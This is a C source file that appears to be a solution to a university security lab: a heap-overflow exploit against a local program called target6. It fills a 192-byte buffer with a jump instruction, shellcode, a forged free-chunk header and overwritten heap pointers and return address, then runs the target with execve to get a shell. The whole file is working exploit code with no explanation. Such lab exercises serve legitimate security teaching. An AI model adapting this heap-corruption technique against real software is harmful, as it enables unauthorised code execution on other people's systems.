#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define TARGET_ADDR_0 0x18
#define TARGET_ADDR_1 0xfe
#define TARGET_ADDR_2 0xa4
#define TARGET_ADDR_3 0x40
#define BUFSIZE 192 
#define SHELLSIZE 45
#define NOPSIZE 0
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attackBuffer[BUFSIZE+1];
	
	int i = 0;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;
	}
	memcpy(&attackBuffer[0], "\xeb\x25",2);
	for (i = 2; i < SHELLSIZE; i++){
		attackBuffer[NOPSIZE + 2 + 6 + i - 2] = shellcode[i];
	}
	//set freebit to 1
	attackBuffer[NOPSIZE + 2 + 2] = 0x91;

	memcpy(&attackBuffer[80-8],"\x28\xee\x04\x01\x80\xee\x04\x01",8);
	memcpy(&attackBuffer[80+8+4],"\x39\xfe\xa4\x40",4);

	attackBuffer[BUFSIZE] = '\0';

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = "";
	

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
